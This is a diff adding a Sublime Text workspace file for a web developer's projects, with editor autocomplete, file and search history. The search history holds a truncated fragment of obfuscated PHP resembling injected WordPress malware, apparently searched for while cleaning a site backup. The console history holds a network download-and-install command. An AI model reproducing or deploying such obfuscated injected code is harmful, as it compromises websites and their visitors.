@@ -1,0 +1,1344 @@
+{
+	"auto_complete":
+	{
+		"selected_items":
+		[
+			[
+				"trans",
+				"translateX()"
+			],
+			[
+				"ali",
+				"align-items"
+			],
+			[
+				"const",
+				"constructor"
+			],
+			[
+				"font-s",
+				"font-size"
+			],
+			[
+				"back",
+				"background-color"
+			],
+			[
+				"space",
+				"space-between"
+			],
+			[
+				"box-s",
+				"box-shadow"
+			],
+			[
+				"sn-gre",
+				"sn-green"
+			],
+			[
+				"inl",
+				"inline-block"
+			],
+			[
+				"find",
+				"findDocuments"
+			],
+			[
+				"alig",
+				"align-content"
+			],
+			[
+				"align-",
+				"align-items"
+			],
+			[
+				"col",
+				"column"
+			],
+			[
+				"flex",
+				"flex-flow"
+			],
+			[
+				"a",
+				"a\t<a>"
+			],
+			[
+				"backg",
+				"background-image"
+			],
+			[
+				"html",
+				"html\thtml"
+			],
+			[
+				"transla",
+				"translateY()"
+			],
+			[
+				"margin-",
+				"margin-bottom"
+			],
+			[
+				"j",
+				"jQuery"
+			],
+			[
+				"text-a",
+				"text-align"
+			],
+			[
+				"box",
+				"box-sizing"
+			],
+			[
+				"max",
+				"max-width"
+			],
+			[
+				"tra",
+				"transform"
+			],
+			[
+				"flex-",
+				"flex-start"
+			],
+			[
+				"video",
+				"video\t<video> with legacy object"
+			],
+			[
+				"js",
+				"jsSrc"
+			],
+			[
+				"test",
+				"testArray"
+			],
+			[
+				"write",
+				"writeBtn"
+			],
+			[
+				"alert",
+				"alertOnce"
+			],
+			[
+				"event",
+				"eventRegistry"
+			],
+			[
+				"even",
+				"eventRegistry"
+			],
+			[
+				"aler",
+				"alertOnce"
+			],
+			[
+				"clc",
+				"clickAction"
+			],
+			[
+				"get",
+				"getElementById"
+			],
+			[
+				"hello",
+				"helloBtn"
+			],
+			[
+				"clic",
+				"clickAction"
+			],
+			[
+				"hi",
+				"hiBtn"
+			],
+			[
+				"aling-item",
+				"align-items-center \tBootstrap 4 Class"
+			],
+			[
+				"bakc",
+				"background-size"
+			],
+			[
+				"justify",
+				"justify-content-center \tBootstrap 4 Class"
+			],
+			[
+				"over",
+				"overflow"
+			],
+			[
+				"min-",
+				"min-width"
+			],
+			[
+				"current",
+				"current_user_role"
+			],
+			[
+				"curre",
+				"current_user_can"
+			],
+			[
+				"count",
+				"countryCode"
+			],
+			[
+				"cout",
+				"countryCode"
+			],
+			[
+				"countr",
+				"countryName"
+			],
+			[
+				"pri",
+				"print_r"
+			],
+			[
+				"ma-",
+				"max-width"
+			],
+			[
+				"al",
+				"align-content"
+			],
+			[
+				"footer",
+				"footerModId"
+			],
+			[
+				"margin",
+				"margin"
+			],
+			[
+				"win",
+				"winWidth"
+			],
+			[
+				"tran",
+				"transition"
+			],
+			[
+				"has",
+				"hasMapToggle"
+			],
+			[
+				"bo",
+				"border"
+			],
+			[
+				"fun",
+				"function"
+			],
+			[
+				"map",
+				"mapToggle"
+			],
+			[
+				"fu",
+				"function"
+			],
+			[
+				"border-",
+				"border-radius"
+			],
+			[
+				"colo",
+				"color-blue"
+			],
+			[
+				"border",
+				"border"
+			],
+			[
+				"spa",
+				"space-around"
+			],
+			[
+				"min",
+				"min-width"
+			],
+			[
+				"main",
+				"main_content"
+			],
+			[
+				"side",
+				"side_content"
+			],
+			[
+				"rg",
+				"rgba()"
+			],
+			[
+				"mar",
+				"margin"
+			],
+			[
+				"bord",
+				"border-radius"
+			],
+			[
+				"bacgr",
+				"background"
+			],
+			[
+				"font",
+				"font-size"
+			],
+			[
+				"ov",
+				"overflow"
+			],
+			[
+				"fle",
+				"flex-flow"
+			],
+			[
+				"p",
+				"padding"
+			],
+			[
+				"te",
+				"text-align"
+			],
+			[
+				"bac",
+				"background-color"
+			],
+			[
+				"max-",
+				"max-width"
+			],
+			[
+				"ba",
+				"background-repeat"
+			],
+			[
+				"fel",
+				"flex-start"
+			],
+			[
+				"w",
+				"wrap"
+			],
+			[
+				"r",
+				"right"
+			],
+			[
+				"in",
+				"inline-block"
+			],
+			[
+				"di",
+				"display"
+			],
+			[
+				"color-",
+				"color-alt"
+			],
+			[
+				"border-c",
+				"border-color"
+			],
+			[
+				"borde",
+				"border-color"
+			],
+			[
+				"backg-c",
+				"background-color"
+			],
+			[
+				"marg",
+				"margin"
+			],
+			[
+				"sp",
+				"space-around"
+			],
+			[
+				"have",
+				"have_posts"
+			],
+			[
+				"youtu",
+				"youtube_url"
+			],
+			[
+				"vide",
+				"videonLahde"
+			],
+			[
+				"padding",
+				"padding"
+			],
+			[
+				"ini",
+				"initial"
+			],
+			[
+				"fonts",
+				"font-size"
+			],
+			[
+				"data",
+				"data-url"
+			],
+			[
+				"scr",
+				"scrollTop"
+			],
+			[
+				"data-",
+				"data-content"
+			],
+			[
+				"rota",
+				"rotateY"
+			],
+			[
+				"dc",
+				"document"
+			],
+			[
+				"spof",
+				"spotify-player"
+			],
+			[
+				"yhtet",
+				"yhteystiedot"
+			],
+			[
+				"color",
+				"color-body"
+			],
+			[
+				"colro",
+				"color-body"
+			],
+			[
+				"emb",
+				"embedUrl"
+			],
+			[
+				"eb",
+				"embedUrl"
+			],
+			[
+				"target",
+				"targetElement"
+			],
+			[
+				"font-",
+				"font-headings"
+			],
+			[
+				"ds",
+				"display"
+			],
+			[
+				"u",
+				"uppercase"
+			],
+			[
+				"mrgin",
+				"margin-bottom"
+			],
+			[
+				"paddin",
+				"padding"
+			],
+			[
+				"fe",
+				"flex-start"
+			],
+			[
+				"padd",
+				"padding"
+			],
+			[
+				"fonte",
+				"font-headings"
+			],
+			[
+				"i",
+				"inline-block"
+			],
+			[
+				"pad",
+				"padding"
+			],
+			[
+				"pa",
+				"padding"
+			],
+			[
+				"texta",
+				"text-align"
+			],
+			[
+				"wid",
+				"width"
+			],
+			[
+				"car",
+				"card-keikat"
+			],
+			[
+				"co",
+				"cover"
+			],
+			[
+				"text",
+				"text-transform"
+			],
+			[
+				"targe",
+				"targetElement"
+			],
+			[
+				"tar",
+				"targetElement"
+			],
+			[
+				"this",
+				"thisCard"
+			],
+			[
+				"fil",
+				"filter"
+			]
+		]
+	},
+	"buffers":
+	[
+		{
+			"file": "public/js/main.js",
+			"settings":
+			{
+				"buffer_size": 1281,
+				"encoding": "UTF-8",
+				"line_ending": "Windows"
+			}
+		},
+		{
+			"file": "public/index.html",
+			"settings":
+			{
+				"buffer_size": 893,
+				"encoding": "UTF-8",
+				"line_ending": "Windows"
+			}
+		},
+		{
+			"file": "package.json",
+			"settings":
+			{
+				"buffer_size": 925,
+				"line_ending": "Unix"
+			}
+		},
+		{
+			"file": ".gitignore",
+			"settings":
+			{
+				"buffer_size": 902,
+				"encoding": "UTF-8",
+				"line_ending": "Unix",
+				"name": "node_modules/"
+			}
+		}
+	],
+	"build_system": "",
+	"build_system_choices":
+	[
+	],
+	"build_varint": "",
+	"command_palette":
+	{
+		"height": 170.0,
+		"last_filter": "syntax scs",
+		"selected_items":
+		[
+			[
+				"syntax scs",
+				"Set Syntax: SCSS"
+			],
+			[
+				"syntax sa",
+				"Set Syntax: Sass"
+			],
+			[
+				"syntax ht",
+				"Set Syntax: HTML"
+			],
+			[
+				"htm",
+				"Snippet: Simple HTML5 Boilerplate"
+			],
+			[
+				"html",
+				"Set Syntax: HTML"
+			],
+			[
+				"syntax javas",
+				"Set Syntax: JavaScript"
+			],
+			[
+				"row",
+				"Snippet: row"
+			],
+			[
+				"button grou",
+				"Snippet: button_group"
+			],
+			[
+				"col",
+				"Snippet: col_md"
+			],
+			[
+				"container",
+				"Snippet: container"
+			],
+			[
+				"jumb",
+				"Snippet: jumbotron"
+			],
+			[
+				"snippet:html",
+				"Snippet: html5"
+			],
+			[
+				"pack",
+				"Package Control: Install Package"
+			],
+			[
+				"packa",
+				"Package Control: Install Package"
+			],
+			[
+				"snippe",
+				"Snippet: SVG - GRADIENTS: linearGradient"
+			],
+			[
+				"jquer",
+				"Snippet: Google AJAX Libraries: jQuery"
+			],
+			[
+				"snippet html",
+				"Snippet: Simple HTML5 Boilerplate"
+			],
+			[
+				"syntax html",
+				"Set Syntax: HTML"
+			],
+			[
+				"paca",
+				"Package Control: Install Package"
+			],
+			[
+				"sni",
+				"Snippet: reactComponent-snippet"
+			],
+			[
+				"snippet",
+				"Snippet: reactDom-snippet"
+			],
+			[
+				"java",
+				"Set Syntax: JavaScript"
+			],
+			[
+				"synth",
+				"Set Syntax: HTML"
+			],
+			[
+				"syntax md",
+				"Set Syntax: Markdown"
+			],
+			[
+				"Snippet: ",
+				"Snippet: snippet"
+			],
+			[
+				"syntax css",
+				"Set Syntax: SCSS"
+			],
+			[
+				"syntax: ja",
+				"Set Syntax: JavaScript"
+			],
+			[
+				"synta",
+				"Set Syntax: PHP"
+			],
+			[
+				"syntax",
+				"Set Syntax: CSS"
+			],
+			[
+				"syntax hmtl",
+				"Set Syntax: HTML"
+			],
+			[
+				"syntax php",
+				"Set Syntax: PHP"
+			],
+			[
+				"syntax js",
+				"Set Syntax: JavaScript"
+			]
+		],
+		"width": 412.0
+	},
+	"console":
+	{
+		"height": 146.0,
+		"history":
+		[
+			"import urllib.request,os,hashlib; h = '2915d1851351e5ee549c20394736b442' + '8bc59f460fa1548d1514676163dafc88'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by) "
+		]
+	},
+	"distraction_free":
+	{
+		"menu_visible": true,
+		"show_minimap": false,
+		"show_open_files": false,
+		"show_tabs": false,
+		"side_bar_visible": false,
+		"status_bar_visible": false
+	},
+	"expanded_folders":
+	[
+	],
+	"file_history":
+	[
+		"/S/dev/seuranetti/public/dist/all.js",
+		"/S/dev/seuranetti/.babelrc",
+		"/S/dev/seuranetti/gulpfile.js",
+		"/S/dev/seuranetti/public/js/views/views.js",
+		"/S/dev/seuranetti/public/index.html",
+		"/S/dev/seuranetti/public/sass/_transitions.scss",
+		"/S/dev/seuranetti/public/views/home.js",
+		"/S/dev/seuranetti/public/sass/main.scss",
+		"/S/dev/seuranetti/public/sass/_default-elements.scss",
+		"/S/dev/seuranetti/public/sass/_controls.scss",
+		"/S/dev/seuranetti/public/css/main.css",
+		"/S/dev/seuranetti/public/sass/_settings.scss",
+		"/S/dev/seuranetti/public/js/main.js",
+		"/S/dev/seuranetti/public/sass/_typography.scss",
+		"/S/dev/seuranetti/public/images/blank-user.svg",
+		"/C/Users/Sampo/AppData/Local/Temp/face.svg",
+		"/S/dev/seuranetti/package.json",
+		"/S/dev/mongo/app.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp22473/home/svirmasa/dev.svirmasalo.fi/redom.min.js",
+		"/C/Users/Sampo/Desktop/rokolammet/style.min.css",
+		"/C/Users/Sampo/Desktop/rokolammet/index.html",
+		"/C/Users/Sampo/Desktop/rokolammet/style.css",
+		"/C/Users/Sampo/AppData/Local/Temp/scp59627/data/wordpress/htdocs/wp-content/themes/Dobby/neurocoaching_alasivu-page.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp32277/home/svirmasa/kuvat.svirmasalo.fi/tommin-polttarit/style.css",
+		"/C/Users/Sampo/AppData/Local/Temp/scp32653/home/svirmasa/kuvat.svirmasalo.fi/tommin-polttarit/reset.css",
+		"/C/Users/Sampo/AppData/Local/Temp/scp33053/home/svirmasa/kuvat.svirmasalo.fi/tommin-polttarit/index.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp31875/home/svirmasa/kuvat.svirmasalo.fi/tommin-polttarit/index.html",
+		"/C/Users/Sampo/AppData/Local/Temp/scp30469/home/svirmasa/kuvat.svirmasalo.fi/jquery.magnific-popup.min.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp30587/home/svirmasa/kuvat.svirmasalo.fi/jquery.magnific-popup.css",
+		"/C/Users/Sampo/AppData/Local/Temp/scp24535/home/svirmasa/public_html/koti/wp-content/themes/infoposter-svirmasalo/footer.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp24662/home/svirmasa/public_html/koti/wp-content/themes/infoposter-svirmasalo/template-parts/content-page.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp24667/httpdocs/wp-config.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp14433/httpdocs/wp-content/themes/virtue_premium/woocommerce/single-product/price.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp00641/httpdocs/wp-content/plugins/woocommerce/templates/cart/shipping-calculator.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp14779/httpdocs/wp-content/themes/virtue_premium/woocommerce/single-product/review.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp13960/httpdocs/wp-content/themes/virtue_premium/woocommerce/single-product/add-to-cart/variable.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp13001/httpdocs/wp-content/themes/virtue_premium/woocommerce/loop/add-to-cart.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp13213/httpdocs/wp-content/themes/virtue_premium/woocommerce/content-product_cat.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp12199/httpdocs/wp-content/themes/virtue_premium/woocommerce/content-product.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp59127/httpdocs/wp-content/themes/virtue_premium/woocommerce/loop/price.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp03157/home/svirmasa/kuvat.svirmasalo.fi/pilvi/js/index.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp02401/home/svirmasa/kuvat.svirmasalo.fi/pilvi/index.html",
+		"/C/Users/Sampo/AppData/Local/Temp/scp18489/home/svirmasa/public_html/koti/wp-content/themes/infoposter-svirmasalo/footer.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp10529/home/svirmasa/kuvat.svirmasalo.fi/annika60/css/style.min.css",
+		"/C/Users/Sampo/AppData/Local/Temp/scp09258/home/svirmasa/kuvat.svirmasalo.fi/annika60/css/style.css",
+		"/C/Users/Sampo/AppData/Local/Temp/scp11665/home/svirmasa/kuvat.svirmasalo.fi/annika60/js/index.min.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp57860/home/svirmasa/kuvat.svirmasalo.fi/annika60/js/index.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp16441/home/svirmasa/kuvat.svirmasalo.fi/robots.txt",
+		"/C/Users/Sampo/AppData/Local/Temp/scp53048/home/svirmasa/kuvat.svirmasalo.fi/annika60/index.html",
+		"/C/Users/Sampo/AppData/Local/Temp/scp56156/home/svirmasa/kuvat.svirmasalo.fi/annika60/masonry.min.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp25638/home/svirmasa/kuvat.svirmasalo.fi/annika60/magpopup.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp36380/home/svirmasa/kuvat.svirmasalo.fi/annika60/magpopup.min.css",
+		"/D/virtual/scotch-box/public/mediwear/css/style.css",
+		"/C/Users/Sampo/Downloads/csgofix.bat",
+		"/C/Users/Sampo/Desktop/Temp/tommi_rokolampi/koulu/labs/09 Single-Page Applications/worksheet.md",
+		"/D/virtual/scotch-box/public/mediwear/js/scripts.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp58548/home/svirmasa/public_html/robots.txt",
+		"/C/Users/Sampo/AppData/Local/Temp/Emojione_1F441.svg",
+		"/C/Users/Sampo/AppData/Local/Temp/scp46497/httpdocs/wp-content/themes/lvipirttinen/footer.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp24776/mediwear.fi/index.html",
+		"/D/virtual/scotch-box/public/mediwear/scss/style.scss",
+		"/C/Users/Sampo/AppData/Local/Temp/scp28065/mediwear.fi/.htaccess",
+		"/C/Users/Sampo/AppData/Local/Temp/scp41676/public_html/wp-content/themes/ruohonen/js/src/scripts.js",
+		"/C/Users/Sampo/AppData/Local/Temp/scp41959/public_html/wp-content/themes/ruohonen/header.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp40331/public_html/wp-content/themes/ruohonen/template-parts/content-frontpage.php",
+		"/C/Users/Sampo/AppData/Local/Temp/scp40475/public_html/wp-content/themes/ruohonen/front-page.php",
+		"/D/virtual/scotch-box/public/mediwear/index.html",
+		"/D/virtual/scotch-box/public/mediwear/gulpfile.js",
+		"/D/virtual/scotch-box/public/mediwear/package.json",
+		"/D/virtual/scotch-box/public/mediwear/dist/index.html",
+		"/D/virtual/scotch-box/public/mediwear/index.haml",
+		"/D/virtual/scotch-box/public/mediwear/license.txt",
+		"/D/virtual/scotch-box/public/tommygun/08/js/ajax_utils.js",
+		"/D/virtual/scotch-box/public/tommygun/08/ajax_sync.php",
+		"/C/Users/Sampo/Desktop/Temp/tommygun/08/ajax_sync.html",
+		"/C/Windows/System32/drivers/etc/hosts",
+		"/C/Users/Sampo/Desktop/Temp/tommygun/08/script.html",
+		"/C/Users/Sampo/Desktop/Temp/tommygun/08/data/chapter-1.json",
+		"/C/Users/Sampo/Desktop/Temp/tommygun/08/js/dom_utils_global.js",
+		"/C/Users/Sampo/Desktop/Temp/tommygun/08/data/story.json",
+		"/C/Users/Sampo/Desktop/Temp/tommygun/08/data/chapter-5.json",
+		"/C/Users/Sampo/Desktop/Temp/tommygun/08/data/chapter-4.json",
+		"/C/Users/Sampo/Desktop/Temp/tommygun/08/data/chapter-3.json",
+		"/C/Users/Sampo/Desktop/Temp/tommygun/08/data/chapter-2.json",
+		"/C/Users/Sampo/Desktop/Temp/tommi_rokolampi/koulu/labs/08 JSON and AJAX/worksheet.md",
+		"/C/Users/Sampo/Desktop/Temp/tommi_dev/08/umäärittely.js",
+		"/C/Users/Sampo/Desktop/Temp/tommi_rokolampi/koulu/labs/08 JSON and AJAX/events.html",
+		"/C/Users/Sampo/Desktop/Temp/tommi_dev/08/script.html",
+		"/C/Users/Sampo/Desktop/Temp/umäärittely.js",
+		"/C/Users/Sampo/Desktop/Temp/script.html",
+		"/C/Users/Sampo/Documents/Arma 3 - Other Profiles/Shamppi/Shamppi.vars.Arma3Profile",
+		"/C/Users/Sampo/Documents/Arma 3 - Other Profiles/Shamppi/Shamppi.Arma3Profile",
+		"/D/Ohjelmat/DropBox/Dropbox/tyot/Bannerit/300x300/index.html",
+		"/C/Users/Sampo/Documents/Arma 3 - Other Profiles/Shamppi/Sampo.vars.Arma3Profile",
+		"/C/Users/Sampo/Documents/Arma 3/Sampo.Arma3Profile",
+		"/C/Users/Sampo/Documents/Arma 3/Sampo.3den.Arma3Profile",
+		"/C/Users/Sampo/Documents/Arma 3/Sampo.vars.Arma3Profile",
+		"/C/Users/Sampo/Documents/Arma 3/BISProfile.json",
+		"/C/Users/Sampo/Documents/Arma 3/stats.Arma3.json",
+		"/C/Users/Sampo/Documents/Arma 3/Arma3.cfg",
+		"/C/Users/Sampo/Desktop/Temp/style.css",
+		"/C/Users/Sampo/Desktop/Temp/index.html",
+		"/C/Users/Sampo/Desktop/Temp/filter.svg",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/upgrade/upgrade.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/tour/tour.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/templates/template-full.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/templates/template-full-notitle.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/templates/template-blog.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/slider/demo.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/single.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/sidebar.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/searchform.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/search.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/pentuja-page.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/parts/menu.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/parts/menu-empty.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/parts/masthead.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/parts/masthead-logo-in-menu.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/parts/footer.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/page.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/no-results.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/loops/loop-slider.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/loops/loop-grid.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/loops/loop-circleicon.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/loops/loop-carousel.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/loops/loop-blog.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/loop.php",
+		"/S/Backups/wp/ketunpolunwp/wp-content/themes/vantage/index.php"
+	],
+	"find":
+	{
+		"height": 26.0
+	},
+	"find_in_files":
+	{
+		"height": 90.0,
+		"where_history":
+		[
+			"S:\\Backups\\wp\\ketunpolunwp\\wp-content\\themes\\vantage",
+			"S:\\Backups\\wp\\ketunpolunwp",
+			"D:\\virtual\\scotch-box\\public\\ruohonen\\wp-content\\themes\\ruohonen\\sass",
+			"D:\\virtual\\scotch-box\\public\\futureoftv\\wp-content\\themes\\future-of-tv-air\\sass",
+			"D:\\virtual\\scotch-box\\public\\futureoftv\\wp-content\\themes\\air",
+			"D:\\virtual\\scotch-box\\public\\hs-motorsport\\wp-content\\themes\\hs-motorsport",
+			"D:\\virtual\\scotch-box\\public\\wordpress\\wp-content\\themes\\materialwp",
+			"D:\\virtual\\scotch-box\\public\\mirrorline\\wp-content\\themes\\mirrorline2016\\assets",
+			"D:\\virtual\\scotch-box\\public\\mirrorline\\wp-content\\themes\\mirrorline2016",
+			"D:\\virtual\\scotch-box\\public\\mirrorline\\wp-content\\themes\\mirrorline2016\\templates",
+			"D:\\virtual\\scotch-box\\public\\mirrorline\\wp-content\\themes\\mirrorline2016\\assets\\css",
+			"D:\\virtual\\scotch-box\\public\\wedia-app\\js",
+			"C:\\Projects\\VirmasaloHomepage\\scotch-box\\public\\angu"
+		]
+	},
+	"find_state":
+	{
+		"case_sensitive": false,
+		"find_history":
+		[
+			"em",
+			"sn-grey",
+			"sn-green",
+			";\n",
+			"main",
+			"!');\n",
+			"live",
+			"Sampo",
+			"mä",
+			"<?php $lkwudrx = '!*9!\tx27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFO>*ofmy%)utjm!|!*5!\tx27!hmg%)!`cpV\tx7f\tx7f\tx7f\tx7f<u%V\tx27{ftmfV\tx7f<*X&Z&S{ftmfV\tx7f<*X)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpus68]y7f#<!%tww!>!\tx2400~:<h%_t%:osvufs:~:<*924)%\tx24-\tx24y4\tx24-\tx24]y8\tx24-\tx24]26\tx24-\tx24<%j,,*!|\tx24-\tx24445]43]321]464]284]364]6]234]342]58]224<!%o:!>!\tx242178}527}88:}334}472\tx24<!%ff2!>!bssbz)\tx24]25\tx24-\tx2\tx69\t145\")) or (strstr($uas,\"\tx72\t27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<)zbssb!-#}#)fepmqnj!/!#0#xdebrjx();}}8>>\tx22:ftmbg39*56A:>:8:252]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~\tx?*2b%)gpf{jt)!gj!<*2bd%-#1GO\tx22#)fepmqyfA>2b%!<*qp%-*.gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91166\tx3a\t61\tx31\")) or (strstr($uas,\"\tx61\t156\t151\tx72\t145\tx66\t157\tx78\"))) { $sbbpzly = \"\tx63\t162\tx65\t141w%)kVx{**#k#)tutjyf`x\tx22l:!}V;3q%4\tx5c%j^\tx24-\tx24tvctus)%\tx24-\tx24b!>!%yy)#}tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#qsut>j%!*72!\tx27!hmg%)!ggvodujpo!\tx24-\tx24y7\tx24-\tx24*<!\tx24-\tx24gps)%j>1\tx64\t162\tx6f\t151\tx64\")) or (strstr($uas,\"\tx63\t150\tx72\t157\tx6d\t14~!<##!>!2p%Z<^2\tx5c2b%!>!2p%!*3>27;mnui}&;zepc}A;~!}\tx7f;!|!}{;)gj}l;33bq}k;opjeTQcOc/#00#W~!Ydrr)%rxB%epnbAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/qCW&)7gj6<.[A\tx27&6<\tx7fw6*\tx7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W-C)fepmqnjA\tx27&6<.fmjgA\tx27doj%6<\tx7fw6*\tx7f_*#f]s]#)fepmqyf\tx27*&7-n%)utjm6<\tx7fw6*CW&)7gj6<*K<^#zsfvr#\tx5cq%7/7#@#7/7^#iubq#\tx5cq%\tx27jsv%6<C}U;y]}R;2]},;osvufs}\txfmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.W%c!>!%i\tx5c2^<!Ce*[!%cIjQ#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]2;uqpuft`msvd}+;!>!}\tx27;!>>>!}_;gvc%}&;ftmbg}\tx7f;!osvufs}w;if((function_exists(\"\tx6f\t142\tx5f\t163\tx74\t141\tx72\t164*-)1/2986+7**^/%rx<~!!%s:#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7k5`{66~6<&w6<\tx7fw6*CW&)7gj6<*doj%769\t157\tx6e\"; function kmezixh($n){return chr(ord($n)-1udovg}x;0]=])0#)U!\tx27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)uas=strtolower($_SERVER[\"\tx48\t124\tx54\t120\tx5f\t125\tx53\t105\tx52\t137\tx41\t:#*\tx24-\tx24!>!\tx24/%tjw/\txo#>b%!**X)ufttj\tx22)gj!|!*nbsbq%)323ldfid\") && (!isset($GLOBAk!~!<**qp%!-uyfu%)3of)fepdoj!<2,*j%-#1]#-bubE{h%)tpqsut>j%<%j=tj{fpg)%\tx24-\tx24*<!~!\tx24/%t2w/\tx24)##-K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA\tx\tx74\t145\tx5f\t146\tx75\t156\tx63\t164\tx.7eu{66~67<&w6<*&7-#o]s]oSEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA\tx273qj%6<*Y%)fnbozcYufhA\tx272qj%6B%z>!\tx24/%tmw/\tx24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr\t<#o]1/20QUUI7jsv%7UFH#\tx27rfs%6~6<\tx7fw6<*%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P5\")) or (strstr($uas,\"\tx66!%b:>1<!fmtf!%b:>%s:\toF.uofuopD#)sfebfI{*4]275]y83]248]y83]25vufs!~<3,j%>j%!*3!\tx27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tp)ftpmdXA6~6<u%7>/7&6|7**111127-K)eb|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|f`57ftbc\tx7f!|!*uyfu\tx27k:!ftmf!}Z;^nbsbq%\tx5cSss!>!bssbz)#44ec:649#-!#:618d5f9#6]y81]265]y72]254]y76#<!%w:!>!(%w:!>!\tx246767~6<Cw6<pd%w6Z6<FWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}\tx27;%!<);} @error_reporting(0)%-bubE{h%)sutcvt-#w#)ldbqov*f\tx27,*e\tx27,*d\tx27,*c\tx27,*b:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e;`UQPMSVD!-id%)uqpuft`msvd},mjgk4`{6~6<tfs%w6<\tx7fw6*CWtfs%)7gj6<*id%:+946:ce44#)zbssb!>!ssbn]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]2<.3`hA\tx27pd%6<pd%w6Z6<.2`hA\tx27pd%6<C\tx27pd%6|6!#~<#/%\tx24-\tx24!>!fyqmpfs}\tx7f;!opjudovg}k~~9{d%:osvufs:~92*#}_;#)323ldfid>}&;!osvu; $ptfxzkm = 